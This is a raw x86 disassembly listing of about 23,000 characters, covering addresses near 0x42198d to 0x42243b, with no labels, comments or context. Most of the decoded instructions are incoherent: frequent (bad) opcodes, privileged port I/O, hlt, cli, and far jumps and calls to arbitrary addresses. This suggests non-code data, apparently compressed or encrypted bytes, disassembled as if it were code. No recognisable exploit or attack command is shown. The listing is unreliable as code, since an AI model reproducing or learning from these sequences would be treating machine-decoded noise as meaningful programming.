  42198d:	mov    edi,0x2482af42
  421992:	or     DWORD PTR [ebx+0x18],ebx
  421995:	pop    ecx
  421996:	fdivr  DWORD PTR [edx+0x7b]
  421999:	or     al,BYTE PTR [edx]
  42199b:	scas   eax,DWORD PTR es:[edi]
  42199c:	inc    ecx
  42199d:	mov    BYTE PTR [eax-0x1545ab03],bl
  4219a3:	xchg   edi,ecx
  4219a5:	(bad)  
  4219a6:	ror    DWORD PTR [edx-0x7e],1
  4219a9:	jle    0x42194d
  4219ab:	sbb    al,BYTE PTR [ebp+0x139d0c14]
  4219b1:	nop
  4219b2:	xor    DWORD PTR [ecx*4-0x73e372b2],edx
  4219b9:	dec    esp
  4219ba:	sbb    eax,0xffffff90
  4219bd:	mov    bh,0xc5
  4219bf:	pop    edx
  4219c0:	fadd   QWORD PTR [eax]
	...
  421a32:	add    BYTE PTR [eax],al
  421a34:	fbstp  TBYTE PTR [edx]
  421a36:	scas   eax,DWORD PTR es:[edi]
  421a37:	adc    ebp,edi
  421a39:	lahf   
  421a3a:	(bad)  
  421a3b:	(bad)  
  421a3c:	mov    al,0x37
  421a3e:	and    edx,DWORD PTR [edx+0x749829e7]
  421a44:	mov    ah,0x67
  421a46:	add    DWORD PTR [eax],eax
  421a48:	cmc    
  421a49:	add    BYTE PTR [eax],al
  421a4b:	add    BYTE PTR [ebx+0x4a],ch
  421a4e:	sbb    DWORD PTR [eax+esi*4+0x78],eax
  421a52:	daa    
  421a53:	cli    
  421a54:	jb     0x421a3c
  421a56:	pop    ss
  421a57:	cli    
  421a58:	and    DWORD PTR [ebp+0x4769e44a],ebp
  421a5e:	add    ebx,DWORD PTR [ecx+esi*1]
  421a61:	push   cs
  421a62:	outs   dx,DWORD PTR ds:[esi]
  421a63:	mov    DWORD PTR [ecx],0x437033a4
  421a69:	fistp  QWORD PTR [ebx-0x1b]
  421a6c:	push   ebx
  421a6d:	ficomp WORD PTR [ecx+0x62]
  421a70:	lahf   
  421a71:	aas    
  421a72:	xchg   BYTE PTR [eax-0x1a907aa1],bh
  421a78:	or     al,0xd8
  421a7a:	or     ah,BYTE PTR [ecx+0x33]
  421a7d:	add    esp,DWORD PTR [esi+0x188c33ac]
  421a83:	mov    al,0x67
  421a85:	sbb    eax,0x59f3c826
  421a8a:	mov    ch,0x2e
  421a8c:	jge    0x421a85
  421a8e:	dec    ebx
  421a8f:	fwait
  421a90:	nop
  421a91:	jp     0x421a21
  421a93:	inc    esi
  421a94:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421a95:	dec    edi
  421a96:	(bad)  
  421a97:	call   0xdfe8cfe6
  421a9c:	inc    ebx
  421a9d:	outs   dx,DWORD PTR ds:[esi]
  421a9e:	xchg   ebx,eax
  421a9f:	sub    al,0x10
  421aa1:	sahf   
  421aa2:	imul   eax,DWORD PTR [ebx-0x59887454],0xffffff87
  421aa9:	aaa    
  421aaa:	dec    edx
  421aab:	and    ebp,DWORD PTR [esi-0x58784ea7]
  421ab1:	xchg   DWORD PTR [eax],esp
  421ab3:	push   0xea565024
  421ab8:	stos   DWORD PTR es:[edi],eax
  421ab9:	leave  
  421aba:	sbb    eax,0xf709de10
  421abf:	cld    
  421ac0:	and    ebx,ebx
  421ac2:	jge    0x421b35
  421ac4:	jge    0x421ade
  421ac6:	jmp    0x50664c16
  421acb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421acc:	and    ah,BYTE PTR [edx-0x51b577ed]
  421ad2:	jmp    0x3fcf:0xadcf4ea2
  421ad9:	dec    esi
  421ada:	sbb    DWORD PTR [esp+eiz*4-0x2d409ec3],eax
  421ae1:	push   ecx
  421ae2:	out    dx,eax
  421ae3:	inc    edi
  421ae4:	out    dx,eax
  421ae5:	mov    DWORD PTR [eax],esi
  421ae7:	ffreep st(2)
  421ae9:	ret    0xdcf
  421aec:	sbb    BYTE PTR [ecx+0x464f42f5],dl
  421af2:	call   0x93a0:0x958592f5
  421af9:	sbb    bl,dl
  421afb:	jecxz  0x421ab3
  421afd:	xor    bl,BYTE PTR [edi+ecx*2+0x4d]
  421b01:	fwait
  421b02:	repz push 0x1f
  421b05:	xchg   ebp,eax
  421b06:	(bad)  
  421b07:	aad    0x1a
  421b09:	clc    
  421b0a:	push   ds
  421b0b:	ror    BYTE PTR [esi-0x22],cl
  421b0e:	cld    
  421b0f:	ret    
  421b10:	and    eax,DWORD PTR [esi]
  421b12:	mov    cl,0x23
  421b14:	push   edi
  421b15:	mov    bh,0x63
  421b17:	mov    esi,0xbbdb7f71
  421b1c:	or     edx,DWORD PTR [edi-0x4718603d]
  421b22:	xchg   edx,eax
  421b23:	rol    DWORD PTR [ebx],cl
  421b25:	push   0x1691d3a4
  421b2a:	dec    ebx
  421b2b:	jle    0x421abe
  421b2d:	xor    DWORD PTR [edi],0x68
  421b30:	mov    eax,0xa522f126
  421b35:	gs ins BYTE PTR es:[edi],dx
  421b37:	aam    0xc9
  421b39:	dec    eax
  421b3a:	xchg   edi,eax
  421b3b:	ja     0x421b58
  421b3d:	mov    ecx,DWORD PTR [ebp-0x3b]
  421b40:	sub    DWORD PTR [eax],eax
	...
  421bb2:	add    BYTE PTR [eax],al
  421bb4:	mov    dl,BYTE PTR ds:0xbf9fb10b
  421bba:	mov    edx,0xae2d6a3f
  421bbf:	sub    edx,DWORD PTR [ebx-0x56127364]
  421bc5:	push   0xf50001
  421bca:	add    BYTE PTR [eax],al
  421bcc:	gs push eax
  421bce:	pop    ebx
  421bcf:	hlt    
  421bd0:	loope  0x421bbf
  421bd2:	and    BYTE PTR [eax-0x6eef6220],0xcc
  421bd9:	dec    edx
  421bda:	pop    ebx
  421bdb:	aas    
  421bdc:	sahf   
  421bdd:	push   esi
  421bde:	out    0x14,eax
  421be0:	mov    bh,0xf1
  421be2:	or     DWORD PTR [ebp+ecx*1+0x58ac4b40],esi
  421be9:	cmp    DWORD PTR [edi+edi*8],esp
  421bec:	sbb    al,0x82
  421bee:	into   
  421bef:	scas   eax,DWORD PTR es:[edi]
  421bf0:	mov    edi,0x29231d2b
  421bf5:	sbb    al,0xdd
  421bf7:	sub    eax,0x82d66ad5
  421bfc:	bound  esi,QWORD PTR [ebp+0x72]
  421bff:	mov    fs,WORD PTR [eax-0x23]
  421c02:	cmc    
  421c03:	fild   QWORD PTR ds:0xc2a3cfab
  421c09:	lods   eax,DWORD PTR ds:[esi]
  421c0a:	mov    bh,0xd4
  421c0c:	mov    dl,0xd9
  421c0e:	xor    DWORD PTR [edi-0x5e],ebx
  421c11:	loopne 0x421c6d
  421c13:	jecxz  0x421c32
  421c15:	out    dx,al
  421c16:	and    al,0x8
  421c18:	sbb    BYTE PTR [ebx+esi*8],dl
  421c1b:	inc    edi
  421c1c:	pop    edi
  421c1d:	sti    
  421c1e:	push   di
  421c20:	div    BYTE PTR [esi+esi*8-0x558614a9]
  421c27:	test   DWORD PTR [ecx-0x24f260dd],edx
  421c2d:	xor    ch,bl
  421c2f:	xlat   BYTE PTR ds:[ebx]
  421c30:	push   esp
  421c31:	dec    ebp
  421c32:	fcomp  DWORD PTR [ebx+0xe]
  421c35:	(bad)  
  421c36:	inc    DWORD PTR [esp+ecx*8]
  421c39:	rcl    DWORD PTR [edi+ebx*8-0x34],1
  421c3d:	in     eax,dx
  421c3e:	cli    
  421c3f:	sbb    DWORD PTR [ebx-0x2c],eax
  421c42:	aas    
  421c43:	xor    ebx,DWORD PTR [esi]
  421c45:	test   eax,0xfcafa412
  421c4a:	test   al,0xc
  421c4c:	push   0xfffffff5
  421c4e:	ja     0x421c9d
  421c50:	icebp  
  421c51:	ret    0xe56b
  421c54:	in     al,dx
  421c55:	dec    ecx
  421c56:	cmp    DWORD PTR [esi],ebp
  421c58:	sbb    BYTE PTR [edx+ecx*8-0xe],bh
  421c5c:	mov    cl,0x21
  421c5e:	aaa    
  421c5f:	xor    DWORD PTR ds:0x9d06031d,0xffffffb0
  421c66:	dec    edx
  421c67:	adc    BYTE PTR [edi-0x1436c044],bh
  421c6d:	mov    ?,ebp
  421c6f:	pop    ds
  421c70:	mov    DWORD PTR [esi-0x49],eax
  421c73:	outs   dx,BYTE PTR ds:[esi]
  421c74:	sbb    BYTE PTR [esi],0xff
  421c77:	(bad)  
  421c78:	call   0x4a352e36
  421c7d:	push   edi
  421c7e:	jle    0x421c87
  421c80:	std    
  421c81:	in     al,dx
  421c82:	out    0x26,eax
  421c84:	xor    cl,ch
  421c86:	push   cs
  421c87:	mov    dh,0x74
  421c89:	sbb    bl,BYTE PTR [ebp+0x19]
  421c8c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421c8d:	repz into 
  421c8f:	out    0xec,eax
  421c91:	add    ebx,esi
  421c93:	(bad)  
  421c94:	repnz xor DWORD PTR [eax-0x30],eax
  421c98:	cli    
  421c99:	(bad)  
  421c9a:	sub    al,0xaf
  421c9c:	push   esp
  421c9d:	mov    ebx,0x95f524ce
  421ca2:	ds jge 0x421d1a
  421ca5:	jle    0x421c90
  421ca7:	pop    es
  421ca8:	lods   al,BYTE PTR ds:[esi]
  421ca9:	xchg   esi,eax
  421caa:	cwde   
  421cab:	lods   al,BYTE PTR ds:[esi]
  421cac:	push   eax
  421cad:	mov    ecx,0xf5fda865
  421cb2:	inc    edi
  421cb3:	fist   WORD PTR [esi-0x56]
  421cb6:	push   edi
  421cb7:	daa    
  421cb8:	stos   BYTE PTR es:[edi],al
  421cb9:	adc    DWORD PTR [edi-0x72],0xffffffa9
  421cbd:	ins    BYTE PTR es:[edi],dx
  421cbe:	imul   DWORD PTR ds:0x78
	...
  421d34:	out    0x1e,eax
  421d36:	into   
  421d37:	push   0x9fe7f8ff
  421d3c:	cmp    al,0xf2
  421d3e:	sub    al,0x59
  421d40:	cmp    DWORD PTR es:[esp+eax*2],0xffffff9e
  421d45:	imul   eax,DWORD PTR [ecx],0xf500
  421d4b:	add    BYTE PTR [esi+esi*1+0x440989d0],bl
  421d52:	addr16 clc 
  421d54:	mov    BYTE PTR [ebx+0x7f124603],bh
  421d5a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421d5b:	adc    BYTE PTR [ebx-0x4acb2cfc],al
  421d61:	ret    0x1782
  421d64:	cmp    ebx,esi
  421d66:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421d67:	cmp    edx,DWORD PTR [esi]
  421d69:	mov    ebp,0x26957628
  421d6e:	cmp    al,0xc3
  421d70:	xchg   BYTE PTR [esi],dh
  421d72:	cmp    DWORD PTR [edi+0x1f],eax
  421d75:	dec    esi
  421d76:	aad    0xd4
  421d78:	test   eax,esi
  421d7a:	mov    bl,0xdc
  421d7c:	(bad)  
  421d7d:	aad    0xac
  421d7f:	mov    dl,0xcc
  421d81:	or     al,0x35
  421d83:	scas   eax,DWORD PTR es:[edi]
  421d84:	mov    al,ds:0x1cb7841e
  421d89:	nop
  421d8a:	sbb    bh,dl
  421d8c:	mov    al,ds:0x6c75073e
  421d91:	dec    ebp
  421d92:	inc    edi
  421d93:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421d94:	scas   eax,DWORD PTR es:[edi]
  421d95:	jmp    0x421d53
  421d97:	cmp    DWORD PTR [esi-0x2d],0xdc8b368b
  421d9e:	hlt    
  421d9f:	mov    bl,0x9
  421da1:	push   edi
  421da2:	arpl   di,di
  421da4:	sub    ch,BYTE PTR [edx+eiz*2+0x71f59e8b]
  421dab:	mov    esp,0xa31f42fe
  421db0:	dec    ebp
  421db1:	in     eax,0xe8
  421db3:	test   DWORD PTR [ecx-0x4895bf61],esp
  421db9:	sbb    esp,ebp
  421dbb:	repnz int3 
  421dbd:	xor    BYTE PTR [eax],bl
  421dbf:	push   edi
  421dc0:	xchg   DWORD PTR [edx+edx*2+0x33],ebx
  421dc4:	ret    0xed7
  421dc7:	push   0x2ea85b99
  421dcc:	xchg   esi,eax
  421dcd:	add    BYTE PTR [esi],bl
  421dcf:	ja     0x421e28
  421dd1:	xor    esi,ebp
  421dd3:	rcr    edx,cl
  421dd5:	sahf   
  421dd6:	outs   dx,DWORD PTR ds:[esi]
  421dd7:	fidiv  WORD PTR [ebp+0x6ea7c90f]
  421ddd:	and    dl,BYTE PTR [edi+0x6587ab6e]
  421de3:	loop   0x421e35
  421de5:	cdq    
  421de6:	(bad)  
  421de7:	imul   edx,DWORD PTR [edx-0x5ea266a4],0x2766dad7
  421df1:	sti    
  421df2:	add    ebx,DWORD PTR [ecx]
  421df4:	pushf  
  421df5:	sub    eax,0xa79e1422
  421dfa:	xchg   DWORD PTR [eax],ebp
  421dfc:	mov    ebx,0x6717ffa2
  421e01:	loop   0x421dc3
  421e03:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421e04:	cli    
  421e05:	jmp    0xa5724bb9
  421e0a:	pop    ss
  421e0b:	push   cs
  421e0c:	push   ebp
  421e0d:	xchg   ebp,eax
  421e0e:	lahf   
  421e0f:	add    BYTE PTR [esi-0x5b],al
  421e12:	js     0x421dc3
  421e14:	jo     0x421e46
  421e16:	add    eax,0x952e1266
  421e1b:	shl    DWORD PTR [ecx-0x1f],0x56
  421e1f:	sbb    BYTE PTR [edx-0x6852ced5],ch
  421e25:	pusha  
  421e26:	add    eax,0x4d2c8847
  421e2b:	inc    esp
  421e2c:	retf   
  421e2d:	push   esp
  421e2e:	sbb    eax,0x471886ea
  421e33:	ret    0x86ff
  421e36:	ds inc ebx
  421e38:	cdq    
  421e39:	xchg   edi,eax
  421e3a:	std    
  421e3b:	popfw  
  421e3d:	nop
  421e3e:	fstp   TBYTE PTR [ebx+0xb]
	...
  421eb4:	and    BYTE PTR [edi-0x28082cbe],dl
  421eba:	mov    cl,0xf7
  421ebc:	fisttp WORD PTR [ebx-0x19]
  421ebf:	jo     0x421e6d
  421ec1:	cld    
  421ec2:	repnz push ebx
  421ec4:	xchg   ebx,eax
  421ec5:	push   0x1
  421ec7:	add    ch,dh
  421ec9:	add    BYTE PTR [eax],al
  421ecb:	add    BYTE PTR [ecx],cl
  421ecd:	pop    ebx
  421ece:	and    edx,0xfffffff0
  421ed1:	lods   al,BYTE PTR ds:[esi]
  421ed2:	test   DWORD PTR [ebx-0x38],ebx
  421ed5:	stos   DWORD PTR es:[edi],eax
  421ed6:	pop    ebp
  421ed7:	add    cl,BYTE PTR [edi-0x7dcf2af2]
  421edd:	inc    eax
  421ede:	dec    edi
  421edf:	adc    eax,0x7a26058
  421ee4:	lods   eax,DWORD PTR ds:[esi]
  421ee5:	call   0x258a1295
  421eea:	in     eax,dx
  421eeb:	pop    edx
  421eec:	xor    eax,0xe1ca16a3
  421ef1:	sti    
  421ef2:	arpl   WORD PTR [eax-0x6e],cx
  421ef5:	into   
  421ef6:	add    BYTE PTR [edx-0x5d],ah
  421ef9:	stos   BYTE PTR es:[edi],al
  421efa:	outs   dx,DWORD PTR ds:[esi]
  421efb:	int3   
  421efc:	dec    esi
  421efd:	jl     0x421f7e
  421eff:	inc    edi
  421f00:	jns    0x421f71
  421f02:	mov    al,ds:0xb29f52fd
  421f07:	dec    eax
  421f08:	push   ecx
  421f09:	push   ds
  421f0a:	in     al,dx
  421f0b:	in     eax,0x8c
  421f0d:	mov    al,al
  421f0f:	test   eax,0xbe506082
  421f14:	mov    edi,0xac4b4445
  421f19:	sub    DWORD PTR [edi],0x73
  421f1c:	xchg   ebp,eax
  421f1d:	test   eax,0x65e1434c
  421f22:	aas    
  421f23:	jmp    0x421efe
  421f25:	lahf   
  421f26:	shr    DWORD PTR [esi+0x2fc9c310],1
  421f2c:	mul    DWORD PTR [ebx+0x5efc79cc]
  421f32:	and    DWORD PTR [ebp+0x7b],0x249389ca
  421f39:	push   eax
  421f3a:	inc    esp
  421f3b:	inc    eax
  421f3c:	cwde   
  421f3d:	mov    ah,0x83
  421f3f:	sbb    BYTE PTR [esi-0x79ee380f],ch
  421f45:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421f46:	ret    0xe790
  421f49:	scas   al,BYTE PTR es:[edi]
  421f4a:	cdq    
  421f4b:	(bad)  
  421f4c:	jno    0x421f3e
  421f4e:	xchg   esi,eax
  421f4f:	xor    eax,0x20e17e42
  421f54:	jne    0x421ef3
  421f56:	fnstcw WORD PTR [ebp-0x77]
  421f59:	or     edi,DWORD PTR ds:0x9aae5fcf
  421f5f:	push   ebx
  421f60:	push   esp
  421f61:	push   es
  421f62:	jns    0x421f34
  421f64:	or     eax,0x58472dad
  421f69:	fistp  WORD PTR [edx]
  421f6b:	xor    BYTE PTR [esi-0x23a07538],dl
  421f71:	fnsave [eax-0x1d7b3e71]
  421f77:	stos   BYTE PTR es:[edi],al
  421f78:	test   eax,0x6cd3b160
  421f7d:	mov    dl,0x3f
  421f7f:	add    dl,BYTE PTR [eax+0x32]
  421f82:	repz sar BYTE PTR [eax],cl
  421f85:	and    bh,ch
  421f87:	pop    ebx
  421f88:	dec    edi
  421f89:	and    bh,BYTE PTR [edi-0xe]
  421f8c:	inc    ebx
  421f8d:	icebp  
  421f8e:	or     eax,0xebb3c9ed
  421f93:	es cwde 
  421f95:	mov    ds:0x1b20608a,eax
  421f9a:	data16 cld 
  421f9c:	test   al,0xa1
  421f9e:	mov    eax,0xc2853def
  421fa3:	sar    DWORD PTR [edx-0x4c],cl
  421fa6:	mov    ds:0xb90c2927,al
  421fab:	shl    BYTE PTR [eax+0x26],cl
  421fae:	fwait
  421faf:	in     al,dx
  421fb0:	mov    ds:0x210c3078,al
  421fb5:	inc    edi
  421fb6:	cmp    ebx,ebx
  421fb8:	pop    edi
  421fb9:	repz cmp edi,ebp
  421fbc:	cmc    
  421fbd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421fbe:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421fbf:	push   0x4b
	...
  422031:	add    BYTE PTR [eax],al
  422033:	add    BYTE PTR [edi-0x243925a2],bl
  422039:	(bad)  
  42203a:	lahf   
  42203b:	pop    edi
  42203c:	bnd ja 0x422029
  42203f:	mov    edi,0x7b4a1205
  422044:	mov    BYTE PTR [ebx+0x1],ch
  422047:	add    ch,dh
  422049:	add    BYTE PTR [eax],al
  42204b:	add    BYTE PTR ds:0x57b7660f,al
  422051:	and    esi,esp
  422053:	xchg   esp,eax
  422054:	add    esp,DWORD PTR [edx]
  422056:	dec    esp
  422057:	inc    ebp
  422058:	mov    eax,0x903aba06
  42205d:	test   BYTE PTR [edi+ebx*8],dl
  422060:	jle    0x4220d6
  422062:	dec    esp
  422063:	ret    0x6cb4
  422066:	outs   dx,BYTE PTR ds:[esi]
  422067:	mov    bh,0xe8
  422069:	lea    ebx,ds:0xfbdafd6
  42206f:	mov    WORD PTR ds:0x9f0d9520,?
  422075:	mov    ebx,0x7b358569
  42207a:	ret    0x2fbb
  42207d:	xor    al,0xc0
  42207f:	ins    DWORD PTR es:[edi],dx
  422080:	and    DWORD PTR [ecx-0x4],esi
  422083:	jne    0x422021
  422085:	enter  0x3fe9,0x2d
  422089:	jne    0x422050
  42208b:	pop    ebp
  42208c:	js     0x42209d
  42208e:	inc    eax
  422090:	in     al,0x60
  422092:	fld    TBYTE PTR [edi+0x36e7d077]
  422098:	sbb    DWORD PTR [edx-0x66],edi
  42209b:	cmp    ebp,DWORD PTR [edi]
  42209d:	dec    edx
  42209e:	push   ss
  42209f:	mov    ds:0xaf9f9b66,al
  4220a4:	adc    BYTE PTR [eax-0x196e4edb],bl
  4220aa:	in     al,0x35
  4220ac:	daa    
  4220ad:	push   edx
  4220ae:	int3   
  4220af:	sbb    cl,BYTE PTR [ecx+0x3b7a69f9]
  4220b5:	icebp  
  4220b6:	xor    ebx,ecx
  4220b8:	clc    
  4220b9:	aas    
  4220ba:	cmc    
  4220bb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4220bc:	mov    esp,0x36835024
  4220c1:	jmp    0x6f3689d8
  4220c6:	cmp    eax,0x397a5139
  4220cb:	arpl   sp,ax
  4220cd:	jb     0x4220ac
  4220cf:	daa    
  4220d0:	fadd   DWORD PTR [ebx-0x1af00514]
  4220d6:	jecxz  0x422118
  4220d8:	and    BYTE PTR cs:[edx-0x77],al
  4220dc:	gs xchg esi,eax
  4220de:	lahf   
  4220df:	add    eax,0x9a617162
  4220e4:	das    
  4220e5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4220e6:	frstor [ecx]
  4220e8:	test   BYTE PTR [ebx],ch
  4220ea:	fcomp  DWORD PTR [ebx-0x5948ff76]
  4220f0:	inc    ebx
  4220f1:	shl    ch,cl
  4220f3:	mov    ah,0x1
  4220f5:	imul   ebx,esp,0xb676f81b
  4220fb:	scas   al,BYTE PTR es:[edi]
  4220fc:	pop    es
  4220fd:	ret    
  4220fe:	rol    DWORD PTR [edx-0x6a704439],0x9e
  422105:	mov    ecx,0xb19933c2
  42210a:	lea    eax,[edx+0xa]
  42210d:	sbb    ebp,edx
  42210f:	mov    esi,0x3f62d6f7
  422114:	ins    DWORD PTR es:[edi],dx
  422115:	mov    ebp,0x9569d807
  42211a:	imul   esi,DWORD PTR [edx+0xb],0x672f9eb6
  422121:	into   
  422122:	fsub   DWORD PTR [ebx]
  422124:	imul   eax,esi,0x33a6c0a1
  42212a:	loopne 0x422174
  42212c:	ds sahf 
  42212e:	mov    eax,0x1f3d5b77
  422133:	mov    bl,BYTE PTR [edi]
  422135:	not    BYTE PTR [ecx-0x7e]
  422138:	shl    eax,1
  42213a:	and    BYTE PTR [ebx-0x4f],cl
  42213d:	shl    DWORD PTR [esi+0x50],0xab
	...
  4221b1:	add    BYTE PTR [eax],al
  4221b3:	add    BYTE PTR [esi-0x700870e1],bl
  4221b9:	idiv   esi
  4221bb:	jg     0x4221f8
  4221bd:	data16 daa 
  4221bf:	aad    0x10
  4221c1:	inc    ebx
  4221c2:	or     al,BYTE PTR [ebp+edi*2+0x6c]
  4221c6:	add    DWORD PTR [eax],eax
  4221c8:	cmc    
  4221c9:	add    BYTE PTR [eax],al
  4221cb:	add    BYTE PTR [edi-0x68],bl
  4221ce:	repnz cmp bl,BYTE PTR [esi+ebx*4+0x68]
  4221d3:	inc    ebp
  4221d4:	imul   ecx,DWORD PTR ds:[edi+0x201bb8ff],0x13dbbb50
  4221df:	or     al,BYTE PTR [ebx-0x1ca98cb0]
  4221e5:	ins    BYTE PTR es:[edi],dx
  4221e6:	and    dh,BYTE PTR [edx+0x1caf9722]
  4221ec:	xor    DWORD PTR [esi+0x6f],esi
  4221ef:	mov    edi,DWORD PTR [esi-0x22]
  4221f2:	xchg   ebp,eax
  4221f3:	or     eax,0xf415b3f4
  4221f8:	jb     0x4221d6
  4221fa:	xchg   ecx,eax
  4221fb:	sbb    edi,edi
  4221fd:	call   0x2d16e145
  422202:	arpl   WORD PTR [esi-0x6d9d8d08],si
  422208:	out    0xea,al
  42220a:	test   DWORD PTR [eax],eax
  42220c:	push   ds
  42220d:	test   edx,esi
  42220f:	push   es
  422210:	loopne 0x422228
  422212:	lock xchg esi,eax
  422214:	test   eax,0x73f012a1
  422219:	mov    bl,ah
  42221b:	sub    BYTE PTR [edx-0x2aa43bde],dh
  422221:	push   eax
  422222:	aad    0x27
  422224:	ins    DWORD PTR es:[edi],dx
  422225:	cli    
  422226:	add    eax,0x73828e09
  42222c:	shr    ebp,cl
  42222e:	jecxz  0x422223
  422230:	mov    ch,0xb5
  422232:	sub    BYTE PTR [esi+0x7070cda7],dh
  422238:	inc    edx
  422239:	mov    dh,0xbb
  42223b:	sub    ch,BYTE PTR [ecx]
  42223d:	fisubr DWORD PTR [edx]
  42223f:	cmp    al,0x38
  422241:	dec    eax
  422242:	aaa    
  422243:	dec    ecx
  422244:	cvtpi2ps xmm1,QWORD PTR [edx+edi*8-0x39]
  422249:	out    dx,eax
  42224a:	out    dx,eax
  42224b:	adc    BYTE PTR [edi+0x3b],bl
  42224e:	add    al,0x92
  422250:	bound  ebp,QWORD PTR [eax]
  422252:	cli    
  422253:	(bad)  
  422254:	pop    edi
  422255:	shl    DWORD PTR [edx+0x29],cl
  422258:	add    al,0x5d
  42225a:	ja     0x422262
  42225c:	sbb    ch,BYTE PTR [ecx]
  42225e:	jge    0x42229a
  422260:	mov    esp,0x139f603e
  422265:	mov    eax,ds:0x90fc118e
  42226a:	sbb    eax,eax
  42226c:	int3   
  42226d:	icebp  
  42226e:	cmp    cl,BYTE PTR [esi]
  422270:	mov    eax,DWORD PTR [esi+esi*4+0x7efb857]
  422277:	xor    esp,ebx
  422279:	xchg   edx,eax
  42227a:	int    0xfb
  42227c:	jp     0x4222b2
  42227e:	jl     0x4222d8
  422280:	xchg   edx,eax
  422281:	dec    edx
  422282:	fdivr  DWORD PTR [ecx-0x23]
  422285:	sub    BYTE PTR [eax+0x32],ch
  422288:	xor    DWORD PTR [esi+0x6a],ecx
  42228b:	out    dx,eax
  42228c:	lea    esi,cs:[edi-0x1f74b7df]
  422293:	iret   
  422294:	pushf  
  422295:	inc    edx
  422296:	ret    
  422297:	push   esp
  422298:	fdivr  st,st(2)
  42229a:	stos   BYTE PTR es:[edi],al
  42229b:	out    dx,al
  42229c:	arpl   WORD PTR [ebx+0x49],di
  42229f:	mov    es,WORD PTR [eax-0x2b9a8381]
  4222a5:	or     DWORD PTR [eax+0x29312f09],ebx
  4222ab:	push   edi
  4222ac:	les    ebx,FWORD PTR [edi]
  4222ae:	es dec eax
  4222b0:	mov    al,0xba
  4222b2:	xor    bh,al
  4222b4:	sahf   
  4222b5:	xchg   edi,eax
  4222b6:	fdiv   DWORD PTR [ebx+esi*8+0x33]
  4222ba:	push   ebp
  4222bb:	js     0x4222b3
  4222bd:	mov    eax,0xcc095b
	...
  422332:	add    BYTE PTR [eax],al
  422334:	inc    bh
  422336:	pop    esp
  422337:	mov    eax,ds:0xdfffbb7d
  42233c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42233d:	inc    edi
  42233e:	gs pop es
  422340:	inc    esi
  422341:	ficomp DWORD PTR [edx+0x20]
  422344:	jb     0x4223b3
  422346:	add    DWORD PTR [eax],eax
  422348:	cmc    
  422349:	add    BYTE PTR [eax],al
  42234b:	add    BYTE PTR [esi+ebp*4-0x80],dh
  42234f:	pop    esp
  422350:	dec    edx
  422351:	mov    ch,ah
  422353:	jmp    0x422321
  422355:	repnz xchg esi,eax
  422357:	jl     0x4222de
  422359:	sub    al,0x5c
  42235b:	inc    edx
  42235c:	push   es
  42235d:	mov    ah,0x1
  42235f:	adc    eax,0xb713523
  422364:	inc    edi
  422365:	cwde   
  422366:	aaa    
  422367:	jp     0x4223a3
  422369:	hlt    
  42236a:	push   ss
  42236b:	inc    ecx
  42236c:	xor    dh,BYTE PTR [ebx]
  42236e:	mov    edx,0x352cd6da
  422373:	inc    eax
  422374:	push   esi
  422375:	xor    DWORD PTR [eax-0x14],esi
  422378:	call   0x1f3b640f
  42237d:	push   ecx
  42237e:	push   ebx
  42237f:	fstp   st(6)
  422381:	mov    dh,BYTE PTR [esp+ebx*8-0x12c8ca1c]
  422388:	xor    ecx,DWORD PTR [ecx-0x77]
  42238b:	aam    0x4a
  42238d:	pop    eax
  42238e:	or     dh,BYTE PTR [ebx+0x4d6fc860]
  422394:	je     0x422337
  422396:	div    BYTE PTR [eax-0x3ce0310a]
  42239c:	push   es
  42239d:	out    dx,eax
  42239e:	js     0x422337
  4223a0:	jb     0x42235c
  4223a2:	rcr    BYTE PTR [ebp+0x871dc9d],cl
  4223a8:	iret   
  4223a9:	test   DWORD PTR [edx-0x2ba93352],edx
  4223af:	cmp    al,0x5e
  4223b1:	adc    edx,eax
  4223b3:	mov    bh,0x41
  4223b5:	mov    dl,0xaf
  4223b7:	sar    BYTE PTR [edi+0x22a33ba2],cl
  4223bd:	rcr    BYTE PTR [ecx],1
  4223bf:	jmp    0x4223cb
  4223c1:	sbb    dh,dh
  4223c3:	or     al,al
  4223c5:	mov    ebp,0xd9a4c888
  4223ca:	sbb    al,0x3f
  4223cc:	cs mov BYTE PTR fs:[esi-0x154cf09a],al
  4223d4:	xlat   BYTE PTR ds:[ebx]
  4223d6:	int    0x91
  4223d8:	sahf   
  4223d9:	or     al,0x43
  4223db:	stos   DWORD PTR es:[edi],eax
  4223dc:	call   0xc3c900e0
  4223e1:	mov    bh,0x81
  4223e3:	xchg   BYTE PTR [esp+edi*4],bh
  4223e6:	adc    BYTE PTR [ebp-0x6bd9a8a3],al
  4223ec:	pusha  
  4223ed:	pop    ebp
  4223ee:	enter  0xd723,0x31
  4223f2:	adc    BYTE PTR [edi],dh
  4223f4:	sahf   
  4223f5:	ds rep stos DWORD PTR es:[edi],eax
  4223f8:	dec    DWORD PTR [ecx+ebx*2-0x6e]
  4223fc:	push   edx
  4223fd:	fld    DWORD PTR [ebp-0x7b]
  422400:	fisttp QWORD PTR [eax-0xd]
  422403:	inc    ebp
  422404:	fist   WORD PTR [ebx]
  422406:	in     al,0xf9
  422408:	mov    dh,0xd4
  42240a:	mov    eax,ds:0x4c0adb4
  42240f:	cmp    eax,0x80f2a3c6
  422414:	push   ebx
  422415:	pushf  
  422416:	pop    eax
  422417:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422418:	mov    ecx,0x8cb2693e
  42241d:	enter  0xcf50,0x4
  422421:	inc    edi
  422422:	fsubr  st(7),st
  422424:	cld    
  422425:	daa    
  422426:	jbe    0x422463
  422428:	andps  xmm3,xmm4
  42242b:	dec    ebp
  42242c:	enter  0xe3cc,0xc3
  422430:	sbb    BYTE PTR [ecx],ah
  422432:	cli    
  422433:	and    eax,0x126ac388
  422438:	ja     0x422424
  42243a:	out    dx,eax
  42243b:	adc    eax,0xeeb78286
